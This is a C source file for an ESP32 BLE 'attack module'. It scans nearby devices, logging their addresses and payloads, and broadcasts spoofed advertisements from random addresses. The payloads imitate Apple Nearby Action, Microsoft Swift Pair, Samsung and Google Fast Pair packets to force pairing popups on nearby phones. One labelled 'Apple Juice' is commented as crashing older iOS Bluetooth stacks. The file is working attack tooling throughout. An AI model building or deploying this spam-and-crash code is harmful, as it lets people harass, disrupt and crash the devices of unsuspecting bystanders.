#include "ble_attack.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "nvs_flash.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "services/gap/ble_svc_gap.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "ble_attack";

static bool     s_initialized = false;
static uint32_t s_tx_count    = 0;
static ble_device_cb_t s_scan_cb = NULL;

/* ── NimBLE host task ───────────────────────────────────────────────── */
static void nimble_host_task(void *param)
{
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static void on_reset(int reason)
{
    ESP_LOGW(TAG, "BLE reset, reason=%d", reason);
}

static void on_sync(void)
{
    ble_hs_id_infer_auto(0, NULL);
    ESP_LOGI(TAG, "BLE synced, ready");
}

/* ── Init / deinit ──────────────────────────────────────────────────── */

esp_err_t ble_attack_init(void)
{
    if (s_initialized) return ESP_OK;

    ESP_ERROR_CHECK(nimble_port_init());
    ble_hs_cfg.reset_cb  = on_reset;
    ble_hs_cfg.sync_cb   = on_sync;
    ble_hs_cfg.gatts_register_cb = NULL;
    ble_hs_cfg.store_status_cb   = NULL;

    ble_svc_gap_init();
    nimble_port_freertos_init(nimble_host_task);

    s_initialized = true;
    ESP_LOGI(TAG, "BLE attack module initialized");
    return ESP_OK;
}

esp_err_t ble_attack_deinit(void)
{
    if (!s_initialized) return ESP_OK;
    nimble_port_stop();
    nimble_port_deinit();
    s_initialized = false;
    return ESP_OK;
}

/* ── Passive scan callback ──────────────────────────────────────────── */

static int scan_event_cb(struct ble_gap_event *event, void *arg)
{
    if (event->type != BLE_GAP_EVENT_EXT_DISC &&
        event->type != BLE_GAP_EVENT_DISC) return 0;

    bm_ble_device_t dev = {0};
    dev.rssi = event->disc.rssi;
    dev.last_seen_ms = (uint32_t)(esp_timer_get_time() / 1000);

    memcpy(dev.addr, event->disc.addr.val, 6);

    if (event->disc.length_data > 0 && event->disc.length_data <= sizeof(dev.payload)) {
        memcpy(dev.payload, event->disc.data, event->disc.length_data);
        dev.payload_len = event->disc.length_data;
    }

    if (s_scan_cb) s_scan_cb(&dev);

    printf("BLE  rssi=%4d  addr=%02x:%02x:%02x:%02x:%02x:%02x\n",
           dev.rssi,
           dev.addr[0], dev.addr[1], dev.addr[2],
           dev.addr[3], dev.addr[4], dev.addr[5]);
    return 0;
}

esp_err_t ble_attack_start_scan(ble_device_cb_t cb)
{
    s_scan_cb = cb;
    struct ble_gap_disc_params params = {
        .itvl          = 0,
        .window        = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited       = 0,
        .passive       = 1,
        .filter_duplicates = 0,
    };
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &params,
                          scan_event_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_disc failed: %d", rc);
        return ESP_FAIL;
    }
    return ESP_OK;
}

esp_err_t ble_attack_stop_scan(void)
{
    ble_gap_disc_cancel();
    return ESP_OK;
}

/* ── Random 6-byte address helper ───────────────────────────────────── */
static void rand_addr(uint8_t out[6])
{
    uint32_t r1 = esp_random(), r2 = esp_random();
    out[0] = r1 & 0xff;  out[1] = (r1>>8)&0xff;  out[2] = (r1>>16)&0xff;
    out[3] = (r1>>24)&0xff; out[4] = r2&0xff; out[5] = (r2>>8)&0xff;
    out[5] |= 0xC0; /* static random addr bits */
}

/* ── Generic advertise-once helper ─────────────────────────────────── */
static esp_err_t adv_once(const uint8_t *data, uint8_t len)
{
    uint8_t addr[6];
    rand_addr(addr);
    ble_gap_adv_stop();

    ble_addr_t rnd_addr = { BLE_ADDR_RANDOM, {0} };
    memcpy(rnd_addr.val, addr, 6);
    ble_hs_id_set_rnd(rnd_addr.val);

    struct ble_gap_adv_params params = {
        .conn_mode    = BLE_GAP_CONN_MODE_NON,
        .disc_mode    = BLE_GAP_DISC_MODE_NON,
        .itvl_min     = 0x0020,
        .itvl_max     = 0x0020,
        .channel_map  = BLE_GAP_ADV_DFLT_CHANNEL_MAP,
        .filter_policy = BLE_HCI_ADV_FILT_NONE,
    };

    struct os_mbuf *om = os_msys_get_pkthdr(len, 0);
    if (!om) return ESP_ERR_NO_MEM;
    os_mbuf_append(om, data, len);
    ble_gap_adv_set_data(data, len);
    os_mbuf_free_chain(om);

    int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, &rnd_addr, 50, &params, NULL, NULL);
    if (rc != 0 && rc != BLE_HS_EALREADY) {
        ESP_LOGD(TAG, "adv_start rc=%d", rc);
    }
    s_tx_count++;
    return ESP_OK;
}

/* ── Attack implementations ─────────────────────────────────────────── */

esp_err_t ble_attack_sour_apple(void)
{
    /* Apple Nearby Action — iOS proximity popup */
    uint8_t payload[] = {
        0x0a, 0xff,
        0x4c, 0x00,             /* Apple Inc. */
        0x0f, 0x05,             /* Nearby Action, len=5 */
        0xc0,                   /* Action flags */
        0x06,                   /* Action type: AirDrop */
        0x00,
        (uint8_t)(esp_random() & 0xff),
        (uint8_t)(esp_random() & 0xff)
    };
    return adv_once(payload, sizeof(payload));
}

esp_err_t ble_attack_swiftpair(void)
{
    /* Microsoft Swift Pair */
    static const char base_name[] = "BinaryMist";
    uint8_t name_len = sizeof(base_name) - 1;
    uint8_t payload[32];
    uint8_t i = 0;
    payload[i++] = 6 + name_len;
    payload[i++] = 0xff;
    payload[i++] = 0x06; payload[i++] = 0x00; /* Microsoft */
    payload[i++] = 0x03; payload[i++] = 0x00;
    payload[i++] = 0x80;
    memcpy(&payload[i], base_name, name_len);
    i += name_len;
    return adv_once(payload, i);
}

esp_err_t ble_attack_samsung(void)
{
    /* Samsung Galaxy pairing popup */
    uint8_t payload[] = {
        0x0e, 0xff,
        0x75, 0x00,             /* Samsung */
        0x42, 0x09, 0x81, 0x02,
        (uint8_t)(esp_random()&0xff),
        (uint8_t)(esp_random()&0xff),
        (uint8_t)(esp_random()&0xff),
        0x00, 0x00, 0x00, 0x00, 0x00
    };
    return adv_once(payload, sizeof(payload));
}

esp_err_t ble_attack_google(void)
{
    /* Google Fast Pair — triggers assistant notification */
    uint8_t payload[] = {
        0x06, 0x16,
        0x2c, 0xfe,             /* Google Fast Pair service UUID */
        (uint8_t)(esp_random()&0xff),
        (uint8_t)(esp_random()&0xff),
        (uint8_t)(esp_random()&0xff)
    };
    return adv_once(payload, sizeof(payload));
}

esp_err_t ble_attack_apple_juice(void)
{
    /* Apple Juice — crash older iOS BT stack */
    uint8_t payload[] = {
        0x1e, 0xff,
        0x4c, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    return adv_once(payload, sizeof(payload));
}

/* ── Extended advertising (BLE 5.0, 254-byte payload) ───────────────── */

esp_err_t ble_attack_ext_adv_start(const uint8_t *payload, uint8_t len)
{
#if CONFIG_BT_NIMBLE_EXT_ADV
    struct ble_gap_ext_adv_params params = {
        .connectable        = 0,
        .scannable          = 0,
        .directed           = 0,
        .high_duty_directed = 0,
        .legacy_pdu         = 0,
        .anonymous          = 1,
        .include_tx_power   = 0,
        .primary_phy        = BLE_HCI_LE_PHY_1M,
        .secondary_phy      = BLE_HCI_LE_PHY_2M,
        .tx_power           = 127,
        .itvl_min           = 0x0020,
        .itvl_max           = 0x0020,
        .sid                = 0,
    };
    int rc = ble_gap_ext_adv_configure(0, &params, NULL, NULL, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ext_adv_configure: %d", rc);
        return ESP_FAIL;
    }

    struct os_mbuf *om = os_msys_get_pkthdr(len, 0);
    if (!om) return ESP_ERR_NO_MEM;
    os_mbuf_append(om, payload, len);
    rc = ble_gap_ext_adv_set_data(0, om);
    if (rc != 0) { ESP_LOGE(TAG, "ext_adv_set_data: %d", rc); return ESP_FAIL; }

    rc = ble_gap_ext_adv_start(0, 0, 0);
    if (rc != 0) { ESP_LOGE(TAG, "ext_adv_start: %d", rc); return ESP_FAIL; }

    s_tx_count++;
    return ESP_OK;
#else
    ESP_LOGW(TAG, "Extended advertising not enabled in sdkconfig");
    return ESP_ERR_NOT_SUPPORTED;
#endif
}

esp_err_t ble_attack_ext_adv_stop(void)
{
#if CONFIG_BT_NIMBLE_EXT_ADV
    ble_gap_ext_adv_stop(0);
#endif
    return ESP_OK;
}

/* ── Stats ──────────────────────────────────────────────────────────── */
uint32_t ble_attack_frames_sent(void) { return s_tx_count; }
void     ble_attack_reset_stats(void) { s_tx_count = 0; }
